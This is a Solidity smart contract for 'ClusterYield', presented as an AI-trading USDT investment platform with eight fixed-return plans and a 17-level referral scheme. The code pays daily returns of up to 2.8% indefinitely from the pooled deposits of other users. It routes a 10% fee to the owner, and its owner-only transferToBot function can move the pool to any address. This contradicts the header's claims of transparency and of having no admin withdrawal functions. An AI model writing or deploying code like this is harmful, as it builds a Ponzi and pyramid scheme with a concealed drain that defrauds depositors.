// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title ClusterYield - AI-Powered DeFi Investment Platform
 * @dev Smart contract for managing USDT investment plans with direct reward distribution
 * @notice This contract allows users to invest USDT in various plans and earn daily rewards
 * Features:
 * - 9 Investment plans with different returns and lock periods (including Micro plan)
 * - 17-level investment-based referral system with commission distribution
 * - Direct reward distribution (no auto-compounding)
 * - AI trading bot integration with profit distribution
 * - Secure fund management with reentrancy protection
 * - Creator-controlled plan management and fee structure
 * - USDT-only platform for stability and transparency
 * - No admin recovery functions for maximum security
 */
contract ClusterYield is ReentrancyGuard, Ownable {
    
    // USDT token contract address on BSC
    IERC20 public immutable USDT;
    
    /**
     * @dev Investment Plan Structure
     * @param dailyReturn Daily return percentage in basis points (50 = 0.5%)
     * @param minDeposit Minimum deposit amount in wei
     * @param lockPeriod Lock period in days before capital can be withdrawn
     * @param isActive Whether the plan is currently accepting new investments
     */
    struct Plan {
        uint256 dailyReturn;     
        uint256 minDeposit;      
        uint256 lockPeriod;      
        bool isActive;           
    }
    
    /**
     * @dev User Investment Structure
     * @param planId ID of the investment plan
     * @param amount Investment amount in wei
     * @param startTime Timestamp when investment was made
     * @param lastClaimTime Timestamp of last reward claim
     * @param totalClaimed Total rewards claimed so far
     * @param capitalWithdrawn Whether capital has been withdrawn
     * @param referrer Address of the referrer who brought this user
     */
    struct Investment {
        uint256 planId;
        uint256 amount;
        uint256 startTime;
        uint256 lastClaimTime;
        uint256 totalClaimed;
        bool capitalWithdrawn;
        address referrer;
    }
    
    /**
     * @dev User Statistics Structure
     * @param investments Array of user's investments
     * @param totalInvested Total amount user has invested
     * @param totalEarned Total rewards user has earned
     * @param totalReferralEarned Total referral commissions earned
     * @param referrer User's referrer address
     * @param referralCount Direct referrals count
     * @param levelReferrals Mapping of referrals per level (0-9 for 10 levels)
     * @param username Public username for display
     * @param telegramId Optional Telegram ID
     */
    struct User {
        Investment[] investments;
        uint256 totalInvested;
        uint256 totalEarned;
        uint256 totalReferralEarned; // Tracks cumulative earned referral bonuses
        uint256 claimableReferralBonus; // Tracks bonuses available for withdrawal
        uint256 totalReferralBonusWithdrawn; // Tracks cumulative withdrawn referral bonuses
        address referrer;
        uint256 referralCount;
        mapping(uint256 => uint256) levelReferrals;
        address[] directReferrals;
        // string username; // Removed
        // string telegramId; // Removed
    }
    
    // State Variables
    mapping(uint256 => Plan) public plans;              // Investment plans mapping
    mapping(address => User) public users;              // User data mapping
    mapping(address => bool) public registered;         // User registration status
    
    uint256 public totalPlans = 8;                      // Total number of investment plans (Micro plan removed)
    uint256 public totalInvested;                       // Total amount invested in platform
    uint256 public totalUsers;                          // Total registered users
    uint256 public totalPayouts;                        // Total rewards paid out
    uint256 public platformFee = 1000;                  // Platform fee in basis points (1000 = 10%)
    
    // AI Trading Bot Integration
    address public tradingBot;                           // Trading bot address
    uint256 public totalBotTransfers;                   // Total USDT sent to bot
    uint256 public totalBotProfits;                     // Total profits received from bot
    
    // Referral commission rates for 17 levels (in basis points)
    // 1st: 20%, 2nd: 10%, 3rd-7th: 5%, 8th-10th: 3%, 11th-17th: 1% (Restored L1 to 20%)
    uint256[] public referralRates = [2000, 1000, 500, 500, 500, 500, 500, 300, 300, 300, 100, 100, 100, 100, 100, 100, 100];
    
    // Maximum values for security and validation
    uint256 private constant MAX_DAILY_RETURN = 500;    // 5% max daily return
    uint256 private constant MAX_LOCK_PERIOD = 365;     // 1 year max lock period
    uint256 private constant MAX_PLATFORM_FEE = 1000;   // 10% max platform fee
    uint256 private constant TOTAL_REFERRAL_LEVELS = 17; // 17 referral levels
    // No limit on investments per user for flexibility
    
    // Events
    event NewInvestment(address indexed user, uint256 planId, uint256 amount, address referrer);
    event RewardsClaimed(address indexed user, uint256 amount);
    event CapitalWithdrawn(address indexed user, uint256 investmentIndex, uint256 amount);
    event ReferralPaid(address indexed referrer, address indexed user, uint256 level, uint256 amount);
    event PlatformFeeUpdated(uint256 oldFee, uint256 newFee);
    event PlanAdded(uint256 planId, uint256 dailyReturn, uint256 minDeposit, uint256 lockPeriod);
    event PlanUpdated(uint256 planId, uint256 dailyReturn, uint256 minDeposit, uint256 lockPeriod, bool isActive);
    event FundsTransferredToBot(uint256 amount);
    event ProfitsReceivedFromBot(uint256 amount);
    event TradingBotUpdated(address indexed oldBot, address indexed newBot);
    event ReferralBonusAccrued(address indexed referrer, address indexed fromUser, uint256 level, uint256 amount); // New Event
    event ReferralBonusClaimed(address indexed user, uint256 amount); // New Event
    // event UserDetailsUpdated(address indexed user, string username, string telegramId); // Removed
    
    /**
     * @dev Constructor initializes the contract with 8 default investment plans
     * @notice Sets up the initial investment plans with varying returns and lock periods
     * Creator becomes the owner and can manage plans and fees
     * @param _usdtAddress Address of USDT token contract on BSC
     */
    constructor(address _usdtAddress) Ownable(msg.sender) {
        require(_usdtAddress != address(0), "ClusterYield: Invalid USDT address");
        USDT = IERC20(_usdtAddress);
        
        // Initialize 8 investment plans (Micro plan removed, others re-indexed)
        // USDT has 18 decimals
        plans[0] = Plan(70, 10 * 10**18, 7, true);       // Formerly Plan 1 (Beginner): 0.7% daily, 10 USDT min, 7 days
        plans[1] = Plan(90, 50 * 10**18, 14, true);      // Formerly Plan 2 (Starter): 0.9% daily, 50 USDT min, 14 days
        plans[2] = Plan(110, 100 * 10**18, 30, true);    // Formerly Plan 3 (Basic): 1.1% daily, 100 USDT min, 30 days
        plans[3] = Plan(130, 500 * 10**18, 60, true);    // Formerly Plan 4 (Standard): 1.3% daily, 500 USDT min, 60 days
        plans[4] = Plan(150, 2500 * 10**18, 90, true);   // Formerly Plan 5 (Advanced): 1.5% daily, 2500 USDT min, 90 days
        plans[5] = Plan(200, 5000 * 10**18, 120, true);  // Formerly Plan 6 (Premium): 2.0% daily, 5000 USDT min, 120 days
        plans[6] = Plan(250, 10000 * 10**18, 150, true); // Formerly Plan 7 (Elite): 2.5% daily, 10000 USDT min, 150 days
        plans[7] = Plan(280, 25000 * 10**18, 180, true); // Formerly Plan 8 (Institutional): 2.8% daily, 25000 USDT min, 180 days
    }
    
    /**
     * @dev Investment function - allows users to invest USDT in a specific plan
     * @param _planId ID of the investment plan (0-7 after Micro plan removal)
     * @param _amount Amount of USDT to invest
     * @param _referrer Address of the referrer (can be zero address)
     * @notice Users transfer USDT to invest in chosen plan, referrer gets commission
     * Requirements:
     * - Plan must exist and be active
     * - Investment amount must meet minimum deposit
     * - Valid referrer address (if provided)
     * - User must have approved USDT transfer
     */
    function invest(uint256 _planId, uint256 _amount, address _referrer) external nonReentrant {
        // Input validation
        require(_planId < totalPlans, "ClusterYield: Invalid plan ID");
        require(plans[_planId].isActive, "ClusterYield: Plan is not active");
        require(_amount >= plans[_planId].minDeposit, "ClusterYield: Amount below minimum deposit");
        require(_amount > 0, "ClusterYield: Investment amount must be greater than 0");
        // No limit on investments per user for flexibility
        
        // Register user if not registered
        if (!registered[msg.sender]) {
            registered[msg.sender] = true;
            totalUsers++;
            
            // Set referrer (only on first investment, with validation)
            if (_referrer != address(0) &&
                _referrer != msg.sender &&
                registered[_referrer]) {
                users[msg.sender].referrer = _referrer;
                users[_referrer].referralCount++;
                users[_referrer].directReferrals.push(msg.sender);
                _updateReferralCounts(_referrer);
            }
        }
        
        // Calculate platform fee (10% goes to owner)
        uint256 feeAmount = (_amount * platformFee) / 10000;
        
        // Transfer USDT from user to contract
        bool success = USDT.transferFrom(msg.sender, address(this), _amount);
        require(success, "ClusterYield: USDT transfer failed");
        
        // Send platform fee to owner if fee > 0
        if (feeAmount > 0) {
            bool feeSuccess = USDT.transfer(owner(), feeAmount);
            require(feeSuccess, "ClusterYield: Platform fee transfer failed");
        }
        
        // Create new investment with full amount for reward calculations
        Investment memory newInvestment = Investment({
            planId: _planId,
            amount: _amount, // Full deposit amount for reward calculations
            startTime: block.timestamp,
            lastClaimTime: block.timestamp,
            totalClaimed: 0,
            capitalWithdrawn: false,
            referrer: users[msg.sender].referrer
        });
        
        users[msg.sender].investments.push(newInvestment);
        users[msg.sender].totalInvested += _amount; // Track full investment amount for stats
        totalInvested += _amount; // Track full investment amount for stats
        
        // Referral commissions will be paid when user generates rewards
        
        emit NewInvestment(msg.sender, _planId, _amount, users[msg.sender].referrer);
    }
    
    /**
     * @dev Claim daily rewards function
     * @param _investmentIndex Index of the investment in user's investments array
     * @notice Allows users to claim their accumulated daily USDT rewards
     * Requirements:
     * - Valid investment index
     * - Capital not withdrawn
     * - Rewards available to claim
     */
    function claimRewards(uint256 _investmentIndex) external nonReentrant {
        require(_investmentIndex < users[msg.sender].investments.length, "ClusterYield: Invalid investment index");
        
        Investment storage investment = users[msg.sender].investments[_investmentIndex];
        require(!investment.capitalWithdrawn, "ClusterYield: Capital already withdrawn");
        
        uint256 rewardAmount = calculateRewards(msg.sender, _investmentIndex);
        require(rewardAmount > 0, "ClusterYield: No rewards available");
        require(USDT.balanceOf(address(this)) >= rewardAmount, "ClusterYield: Insufficient contract balance");
        
        // Update investment data
        investment.lastClaimTime = block.timestamp;
        investment.totalClaimed += rewardAmount;
        users[msg.sender].totalEarned += rewardAmount;
        totalPayouts += rewardAmount;
        
        // Pay referral commissions from contract balance (not deducted from user rewards)
        _payReferralCommissions(msg.sender, rewardAmount);
        
        // Transfer full reward amount to user
        bool success = USDT.transfer(msg.sender, rewardAmount);
        require(success, "ClusterYield: Reward transfer failed");
        
        emit RewardsClaimed(msg.sender, rewardAmount);
    }
    
    /**
     * @dev Withdraw capital function (only after lock period expires)
     * @param _investmentIndex Index of the investment in user's investments array
     * @notice Allows users to withdraw their initial USDT capital after lock period
     * Requirements:
     * - Valid investment index
     * - Capital not already withdrawn
     * - Lock period must have expired
     */
    function withdrawCapital(uint256 _investmentIndex) external nonReentrant {
        require(_investmentIndex < users[msg.sender].investments.length, "ClusterYield: Invalid investment index");
        
        Investment storage investment = users[msg.sender].investments[_investmentIndex];
        require(!investment.capitalWithdrawn, "ClusterYield: Capital already withdrawn");
        
        uint256 lockEndTime = investment.startTime + (plans[investment.planId].lockPeriod * 1 days);
        require(block.timestamp >= lockEndTime, "ClusterYield: Lock period not expired");
        
        // Claim any pending rewards first
        uint256 rewardAmount = calculateRewards(msg.sender, _investmentIndex);
        if (rewardAmount > 0) {
            investment.totalClaimed += rewardAmount;
            users[msg.sender].totalEarned += rewardAmount;
            totalPayouts += rewardAmount;
            
            // Pay referral commissions from contract balance (not deducted from user rewards)
            _payReferralCommissions(msg.sender, rewardAmount);
        }
        
        investment.capitalWithdrawn = true;
        investment.lastClaimTime = block.timestamp;
        
        uint256 totalAmount = investment.amount + rewardAmount;
        require(USDT.balanceOf(address(this)) >= totalAmount, "ClusterYield: Insufficient contract balance");
        
        // Transfer capital + final rewards to user
        bool success = USDT.transfer(msg.sender, totalAmount);
        require(success, "ClusterYield: Capital withdrawal failed");
        
        emit CapitalWithdrawn(msg.sender, _investmentIndex, totalAmount);
        if (rewardAmount > 0) {
            emit RewardsClaimed(msg.sender, rewardAmount);
        }
    }
    
    /**
     * @dev Calculate available rewards for a specific investment
     * @param _user Address of the user
     * @param _investmentIndex Index of the investment
     * @return rewardAmount Available reward amount in wei
     * @notice Calculates rewards based on time elapsed since last claim
     */
    function calculateRewards(address _user, uint256 _investmentIndex) public view returns (uint256) {
        if (_investmentIndex >= users[_user].investments.length) return 0;
        
        Investment memory investment = users[_user].investments[_investmentIndex];
        if (investment.capitalWithdrawn) return 0;
        
        Plan memory plan = plans[investment.planId];
        
        uint256 timeDiff = block.timestamp - investment.lastClaimTime;
        uint256 dailyReward = (investment.amount * plan.dailyReturn) / 10000; // Convert basis points
        uint256 rewardAmount = (dailyReward * timeDiff) / 1 days;
        
        // Rewards accrue indefinitely until capital is withdrawn.
        // The lock period only gatekeeps capital withdrawal, not reward accrual.
        // Therefore, the capping logic previously here is removed.
        
        return rewardAmount;
    }
    
    /**
     * @dev Get user's total available rewards across all investments
     * @param _user Address of the user
     * @return totalRewards Total claimable rewards in wei
     */
    function getUserTotalRewards(address _user) external view returns (uint256) {
        uint256 totalRewards = 0;
        uint256 investmentCount = users[_user].investments.length;
        
        for (uint256 i = 0; i < investmentCount; i++) {
            totalRewards += calculateRewards(_user, i);
        }
        return totalRewards;
    }
    
    /**
     * @dev Get user's investment count
     * @param _user Address of the user
     * @return count Number of investments made by user
     */
    function getUserInvestmentCount(address _user) external view returns (uint256) {
        return users[_user].investments.length;
    }
    
    /**
     * @dev Get specific investment details
     * @param _user Address of the user
     * @param _index Index of the investment
     * @return planId ID of the investment plan
     * @return amount Investment amount in wei
     * @return startTime Timestamp when investment was made
     * @return lastClaimTime Timestamp of last reward claim
     * @return totalClaimed Total rewards claimed so far
     * @return capitalWithdrawn Whether capital has been withdrawn
     * @return referrer Address of the referrer
     */
    function getUserInvestment(address _user, uint256 _index) external view returns (
        uint256 planId,
        uint256 amount,
        uint256 startTime,
        uint256 lastClaimTime,
        uint256 totalClaimed,
        bool capitalWithdrawn,
        address referrer
    ) {
        require(_index < users[_user].investments.length, "ClusterYield: Invalid index");
        Investment memory investment = users[_user].investments[_index];
        return (
            investment.planId,
            investment.amount,
            investment.startTime,
            investment.lastClaimTime,
            investment.totalClaimed,
            investment.capitalWithdrawn,
            investment.referrer
        );
    }

    
    /**
     * @dev Get user's investment-based referral level access
     * @param _user Address of the user
     * @return maxLevels Maximum referral levels user can earn from based on the sum of their active investments
     */
    function getUserReferralLevels(address _user) public view returns (uint256) {
        uint256 currentActiveInvestmentSum = 0;
        uint256 investmentCount = users[_user].investments.length;
        for (uint256 i = 0; i < investmentCount; i++) {
            if (!users[_user].investments[i].capitalWithdrawn) {
                currentActiveInvestmentSum += users[_user].investments[i].amount;
            }
        }

        // If no active investments or sum is less than the first tier, 0 levels.
        if (currentActiveInvestmentSum < 5 * 10**18) { // Minimum threshold for any level is $5
            return 0;
        }
        
        // Referral level unlock criteria based on the SUM OF ACTIVE investments
        // Max 17 levels, with the 17th level unlocking at $1000 USDT active sum
        if (currentActiveInvestmentSum >= 1000 * 10**18) return 17; // $1000+ USDT
        if (currentActiveInvestmentSum >= 900 * 10**18) return 16;  // $900+ USDT
        if (currentActiveInvestmentSum >= 800 * 10**18) return 15;  // $800+ USDT
        if (currentActiveInvestmentSum >= 700 * 10**18) return 14;  // $700+ USDT
        if (currentActiveInvestmentSum >= 600 * 10**18) return 13;  // $600+ USDT
        if (currentActiveInvestmentSum >= 550 * 10**18) return 12;  // $550+ USDT
        if (currentActiveInvestmentSum >= 500 * 10**18) return 11;  // $500+ USDT
        if (currentActiveInvestmentSum >= 450 * 10**18) return 10;  // $450+ USDT
        if (currentActiveInvestmentSum >= 400 * 10**18) return 9;   // $400+ USDT
        if (currentActiveInvestmentSum >= 350 * 10**18) return 8;   // $350+ USDT
        if (currentActiveInvestmentSum >= 300 * 10**18) return 7;   // $300+ USDT
        if (currentActiveInvestmentSum >= 250 * 10**18) return 6;   // $250+ USDT
        if (currentActiveInvestmentSum >= 200 * 10**18) return 5;   // $200+ USDT
        if (currentActiveInvestmentSum >= 150 * 10**18) return 4;   // $150+ USDT
        if (currentActiveInvestmentSum >= 100 * 10**18) return 3;   // $100+ USDT
        if (currentActiveInvestmentSum >= 50 * 10**18) return 2;    // $50+ USDT
        // The check for currentActiveInvestmentSum >= 5 * 10**18 is implicitly handled by the first check.
        // If it passed the initial currentActiveInvestmentSum < 5 * 10**18, it means it's >= 5.
        return 1; // If >= $5 but less than $50
    }
    
    /**
     * @dev Transfer USDT to trading bot for AI trading
     * @param _amount Amount of USDT to transfer to bot
     * @notice Only owner can transfer funds to trading bot
     */
    function transferToBot(uint256 _amount) external onlyOwner {
        require(_amount > 0, "ClusterYield: Amount must be greater than 0");
        require(USDT.balanceOf(address(this)) >= _amount, "ClusterYield: Insufficient contract balance");
        require(tradingBot != address(0), "ClusterYield: Trading bot address not set");
        
        bool success = USDT.transfer(tradingBot, _amount);
        require(success, "ClusterYield: Transfer to bot failed");
        
        totalBotTransfers += _amount;
        emit FundsTransferredToBot(_amount);
    }
    
    /**
     * @dev Receive profits from trading bot
     * @param _amount Amount of USDT profits to receive from bot
     * @notice Only owner can receive profits from trading bot
     */
    function receiveProfits(uint256 _amount) external onlyOwner {
        require(_amount > 0, "ClusterYield: Amount must be greater than 0");
        
        bool success = USDT.transferFrom(tradingBot, address(this), _amount);
        require(success, "ClusterYield: Transfer from bot failed");
        
        totalBotProfits += _amount;
        emit ProfitsReceivedFromBot(_amount);
    }
    
    /**
     * @dev Set trading bot address (only owner)
     * @param _botAddress Address of the trading bot
     */
    function setTradingBot(address _botAddress) external onlyOwner {
        require(_botAddress != address(0), "ClusterYield: Invalid bot address");
        address oldBot = tradingBot;
        tradingBot = _botAddress;
        emit TradingBotUpdated(oldBot, _botAddress);
    }
    
    /**
     * @dev Internal function to pay referral commissions up the chain (investment-based)
     * @param _user Address of the investor
     * @param _amount Reward amount to calculate commissions from
     * @notice Pays USDT commissions based on referrer's investment level (up to 17 levels)
     */
    function _payReferralCommissions(address _user, uint256 _amount) internal {
        address referrer = users[_user].referrer;
        
        for (uint256 i = 0; i < referralRates.length && referrer != address(0); i++) {
            uint256 referrerMaxLevels = getUserReferralLevels(referrer);
            
            // Only pay commission if referrer's investment level allows this generation
            if ((i + 1) <= referrerMaxLevels) {
                uint256 commission = (_amount * referralRates[i]) / 10000;
                
                if (commission > 0) { // No need to check contract balance here, only on actual withdrawal
                    users[referrer].totalReferralEarned += commission; // Still tracks total earned
                    users[referrer].claimableReferralBonus += commission; // Accrue to claimable balance
                    emit ReferralBonusAccrued(referrer, _user, i + 1, commission);
                }
            }
            
            referrer = users[referrer].referrer;
        }
    }
    
    /**
     * @dev Update referral counts for all levels when new user joins
     * @param _referrer Address of the direct referrer
     * @notice Updates referral counts up the chain for analytics
     */
    function _updateReferralCounts(address _referrer) internal {
        address current = _referrer;
        
        for (uint256 i = 0; i < referralRates.length && current != address(0); i++) {
            users[current].levelReferrals[i]++;
            current = users[current].referrer;
        }
    }

    /**
     * @dev Allows a user to claim their accrued referral bonuses.
     * @notice Transfers the user's claimable referral bonus amount to their wallet.
     */
    function claimReferralBonuses() external nonReentrant {
        User storage user = users[msg.sender];
        uint256 amountToClaim = user.claimableReferralBonus;

        require(amountToClaim > 0, "ClusterYield: No referral bonuses to claim");
        require(USDT.balanceOf(address(this)) >= amountToClaim, "ClusterYield: Insufficient contract balance for bonus payout");

        user.claimableReferralBonus = 0;
        user.totalReferralBonusWithdrawn += amountToClaim;
        totalPayouts += amountToClaim; // Add to global payouts if referral bonuses are considered part of it

        bool success = USDT.transfer(msg.sender, amountToClaim);
        require(success, "ClusterYield: Referral bonus transfer failed");

        emit ReferralBonusClaimed(msg.sender, amountToClaim);
    }

    // Removed updateUserDetails function
    
    // ============ OWNER FUNCTIONS ============
    
    /**
     * @dev Add a new investment plan (only owner)
     * @param _dailyReturn Daily return in basis points
     * @param _minDeposit Minimum deposit amount in wei
     * @param _lockPeriod Lock period in days
     * @notice Allows owner to add new investment plans with validation
     */
    function addPlan(uint256 _dailyReturn, uint256 _minDeposit, uint256 _lockPeriod) external onlyOwner {
        require(_dailyReturn <= MAX_DAILY_RETURN, "ClusterYield: Daily return too high");
        require(_lockPeriod <= MAX_LOCK_PERIOD, "ClusterYield: Lock period too long");
        require(_minDeposit > 0, "ClusterYield: Minimum deposit must be greater than 0");
        
        plans[totalPlans] = Plan(_dailyReturn, _minDeposit, _lockPeriod, true);
        
        emit PlanAdded(totalPlans, _dailyReturn, _minDeposit, _lockPeriod);
        totalPlans++;
    }
    
    /**
     * @dev Update an existing investment plan (only owner)
     * @param _planId ID of the plan to update
     * @param _dailyReturn New daily return in basis points
     * @param _minDeposit New minimum deposit amount
     * @param _lockPeriod New lock period in days
     * @param _isActive Whether the plan should be active
     */
    function updatePlan(uint256 _planId, uint256 _dailyReturn, uint256 _minDeposit, uint256 _lockPeriod, bool _isActive) external onlyOwner {
        require(_planId < totalPlans, "ClusterYield: Invalid plan ID");
        require(_dailyReturn <= MAX_DAILY_RETURN, "ClusterYield: Daily return too high");
        require(_lockPeriod <= MAX_LOCK_PERIOD, "ClusterYield: Lock period too long");
        require(_minDeposit > 0, "ClusterYield: Minimum deposit must be greater than 0");
        
        plans[_planId] = Plan(_dailyReturn, _minDeposit, _lockPeriod, _isActive);
        
        emit PlanUpdated(_planId, _dailyReturn, _minDeposit, _lockPeriod, _isActive);
    }
    
    /**
     * @dev Update platform fee (only owner)
     * @param _newFee New platform fee in basis points (max 10%)
     * @notice Platform fee is taken from investments and sent to owner
     */
    function updatePlatformFee(uint256 _newFee) external onlyOwner {
        require(_newFee <= MAX_PLATFORM_FEE, "ClusterYield: Platform fee too high");
        
        uint256 oldFee = platformFee;
        platformFee = _newFee;
        
        emit PlatformFeeUpdated(oldFee, _newFee);
    }
    
    /**
     * @dev Get contract USDT balance
     * @return balance Current USDT balance of the contract
     */
    function getContractBalance() external view returns (uint256) {
        return USDT.balanceOf(address(this));
    }
    
    /**
     * @dev Get USDT token address
     * @return usdtAddress Address of the USDT token contract
     */
    function getUSDTAddress() external view returns (address) {
        return address(USDT);
    }
    
    /**
     * @dev Get trading bot statistics
     * @return botAddress Current trading bot address
     * @return totalTransfers Total USDT transferred to bot
     * @return totalProfits Total profits received from bot
     */
    function getBotStats() external view returns (address, uint256, uint256) {
        return (tradingBot, totalBotTransfers, totalBotProfits);
    }
    
    /**
     * @dev Get platform statistics
     * @return plans Total number of plans
     * @return users Total registered users
     * @return invested Total USDT invested
     * @return payouts Total USDT paid as rewards
     */
    function getPlatformStats() external view returns (uint256, uint256, uint256, uint256) {
        return (totalPlans, totalUsers, totalInvested, totalPayouts);
    }

    /**
     * @dev Get the number of referrals a user has at a specific downline level
     * @param _user Address of the user whose downline is being queried
     * @param _level The downline level (0 for 1st gen, 1 for 2nd gen, etc., up to 16 for 17th gen)
     * @return count Number of referrals at that specific level for the user
     */
    function getDownlineCountAtLevel(address _user, uint256 _level) external view returns (uint256) {
        require(_level < TOTAL_REFERRAL_LEVELS, "ClusterYield: Invalid level");
        // Accesses the User struct's levelReferrals mapping.
        // users[_user].levelReferrals[0] is count of direct referrals (_user's 1st generation)
        // users[_user].levelReferrals[1] is count of _user's 2nd generation referrals, etc.
        return users[_user].levelReferrals[_level];
    }

    /**
     * @dev Struct to hold summary stats for a user, useful for referral lists.
     */
    struct UserSummary {
        uint256 totalInvested;
        uint256 totalEarned;
        uint256 activeInvestmentCount;
        uint256 totalReferralEarned;
        uint256 referralCount;
    }

    /**
     * @dev Get a summary of a user's statistics.
     * @param _user The address of the user.
     * @return A summary of the user's stats.
     */
    function getUserSummary(address _user) external view returns (UserSummary memory) {
        User storage user = users[_user];
        uint256 activeCount = 0;
        for (uint i = 0; i < user.investments.length; i++) {
            if (!user.investments[i].capitalWithdrawn) {
                activeCount++;
            }
        }

        return UserSummary({
            totalInvested: user.totalInvested,
            totalEarned: user.totalEarned,
            activeInvestmentCount: activeCount,
            totalReferralEarned: user.totalReferralEarned,
            referralCount: user.referralCount
        });
    }

    /**
     * @dev Get a user's list of direct referrals.
     * @param _user The address of the user.
     * @return A list of addresses of direct referrals.
     */
    function getDirectReferrals(address _user) external view returns (address[] memory) {
        return users[_user].directReferrals;
    }

    /**
     * @dev Get the complete upline chain for a user
     * @param _user Address of the user
     * @return uplineChain Array of addresses representing the user's upline from direct referrer to top
     */
    function getUserUpline(address _user) external view returns (address[] memory) {
        address[] memory uplineChain = new address[](TOTAL_REFERRAL_LEVELS);
        address current = users[_user].referrer;
        uint256 count = 0;
        
        while (current != address(0) && count < TOTAL_REFERRAL_LEVELS) {
            uplineChain[count] = current;
            current = users[current].referrer;
            count++;
        }
        
        // Create a properly sized array to return
        address[] memory result = new address[](count);
        for (uint256 i = 0; i < count; i++) {
            result[i] = uplineChain[i];
        }
        
        return result;
    }

    /**
     * @dev Get network investment statistics for a specific level
     * @param _user Address of the user whose network to analyze
     * @param _level Level to analyze (0 = direct referrals, 1 = 2nd level, etc.)
     * @return totalAmount Total investment amount at this level
     * @return activeAmount Total active investment amount at this level
     * @return investmentCount Total number of investments at this level
     * @return activeInvestmentCount Number of active investments at this level
     * @return userCount Number of unique users at this level
     */
    function getNetworkLevelStats(address _user, uint256 _level) external view returns (
        uint256 totalAmount,
        uint256 activeAmount,
        uint256 investmentCount,
        uint256 activeInvestmentCount,
        uint256 userCount
    ) {
        require(_level < TOTAL_REFERRAL_LEVELS, "ClusterYield: Invalid level");
        
        address[] memory usersAtLevel = _getUsersAtLevel(_user, _level);
        userCount = usersAtLevel.length;
        
        for (uint256 i = 0; i < usersAtLevel.length; i++) {
            address userAtLevel = usersAtLevel[i];
            User storage userStats = users[userAtLevel];
            
            totalAmount += userStats.totalInvested;
            investmentCount += userStats.investments.length;
            
            // Calculate active investments
            for (uint256 j = 0; j < userStats.investments.length; j++) {
                if (!userStats.investments[j].capitalWithdrawn) {
                    activeAmount += userStats.investments[j].amount;
                    activeInvestmentCount++;
                }
            }
        }
    }

    /**
     * @dev Get comprehensive network statistics for all levels
     * @param _user Address of the user whose network to analyze
     * @return levelStats Array of stats for each level [totalAmount, activeAmount, investmentCount, activeInvestmentCount, userCount]
     */
    function getCompleteNetworkStats(address _user) external view returns (uint256[5][] memory levelStats) {
        levelStats = new uint256[5][](TOTAL_REFERRAL_LEVELS);
        
        for (uint256 level = 0; level < TOTAL_REFERRAL_LEVELS; level++) {
            address[] memory usersAtLevel = _getUsersAtLevel(_user, level);
            uint256 userCount = usersAtLevel.length;
            uint256 totalAmount = 0;
            uint256 activeAmount = 0;
            uint256 investmentCount = 0;
            uint256 activeInvestmentCount = 0;
            
            for (uint256 i = 0; i < usersAtLevel.length; i++) {
                address userAtLevel = usersAtLevel[i];
                User storage userStats = users[userAtLevel];
                
                totalAmount += userStats.totalInvested;
                investmentCount += userStats.investments.length;
                
                // Calculate active investments
                for (uint256 j = 0; j < userStats.investments.length; j++) {
                    if (!userStats.investments[j].capitalWithdrawn) {
                        activeAmount += userStats.investments[j].amount;
                        activeInvestmentCount++;
                    }
                }
            }
            
            levelStats[level] = [totalAmount, activeAmount, investmentCount, activeInvestmentCount, userCount];
        }
    }

    /**
     * @dev Get users at a specific network level
     * @param _user Address of the user whose network to analyze
     * @param _level Level to get users for (0 = direct referrals, 1 = 2nd level, etc.)
     * @return usersAtLevel Array of user addresses at the specified level
     */
    function getUsersAtLevel(address _user, uint256 _level) external view returns (address[] memory) {
        require(_level < TOTAL_REFERRAL_LEVELS, "ClusterYield: Invalid level");
        return _getUsersAtLevel(_user, _level);
    }

    /**
     * @dev Internal function to get users at a specific network level
     * @param _user Address of the user whose network to analyze
     * @param _level Level to get users for
     * @return usersAtLevel Array of user addresses at the specified level
     */
    function _getUsersAtLevel(address _user, uint256 _level) internal view returns (address[] memory) {
        if (_level == 0) {
            return users[_user].directReferrals;
        }
        
        // For levels > 0, we need to recursively find users
        address[] memory previousLevel = _getUsersAtLevel(_user, _level - 1);
        uint256 totalCount = 0;
        
        // First, count total users at this level
        for (uint256 i = 0; i < previousLevel.length; i++) {
            totalCount += users[previousLevel[i]].directReferrals.length;
        }
        
        // Create array and populate it
        address[] memory usersAtLevel = new address[](totalCount);
        uint256 currentIndex = 0;
        
        for (uint256 i = 0; i < previousLevel.length; i++) {
            address[] memory directRefs = users[previousLevel[i]].directReferrals;
            for (uint256 j = 0; j < directRefs.length; j++) {
                usersAtLevel[currentIndex] = directRefs[j];
                currentIndex++;
            }
        }
        
        return usersAtLevel;
    }

    /**
     * @dev Get detailed investment breakdown for a specific user
     * @param _user Address of the user
     * @return investments Array of investment details [planId, amount, startTime, isActive]
     */
    function getUserInvestmentDetails(address _user) external view returns (uint256[4][] memory investments) {
        User storage user = users[_user];
        investments = new uint256[4][](user.investments.length);
        
        for (uint256 i = 0; i < user.investments.length; i++) {
            Investment storage investment = user.investments[i];
            investments[i] = [
                investment.planId,
                investment.amount,
                investment.startTime,
                investment.capitalWithdrawn ? 0 : 1  // 0 = inactive, 1 = active
            ];
        }
    }

    /**
     * @dev Get network summary statistics
     * @param _user Address of the user whose network to analyze
     * @return totalNetworkInvestment Total investment amount across all levels
     * @return totalActiveNetworkInvestment Total active investment amount across all levels
     * @return totalNetworkUsers Total number of users in network across all levels
     * @return totalNetworkInvestments Total number of investments across all levels
     * @return levelsWithUsers Number of levels that have at least one user
     */
    function getNetworkSummary(address _user) external view returns (
        uint256 totalNetworkInvestment,
        uint256 totalActiveNetworkInvestment,
        uint256 totalNetworkUsers,
        uint256 totalNetworkInvestments,
        uint256 levelsWithUsers
    ) {
        for (uint256 level = 0; level < TOTAL_REFERRAL_LEVELS; level++) {
            address[] memory usersAtLevel = _getUsersAtLevel(_user, level);
            
            if (usersAtLevel.length > 0) {
                levelsWithUsers++;
                totalNetworkUsers += usersAtLevel.length;
                
                for (uint256 i = 0; i < usersAtLevel.length; i++) {
                    address userAtLevel = usersAtLevel[i];
                    User storage userStats = users[userAtLevel];
                    
                    totalNetworkInvestment += userStats.totalInvested;
                    totalNetworkInvestments += userStats.investments.length;
                    
                    // Calculate active investments
                    for (uint256 j = 0; j < userStats.investments.length; j++) {
                        if (!userStats.investments[j].capitalWithdrawn) {
                            totalActiveNetworkInvestment += userStats.investments[j].amount;
                        }
                    }
                }
            }
        }
    }
}
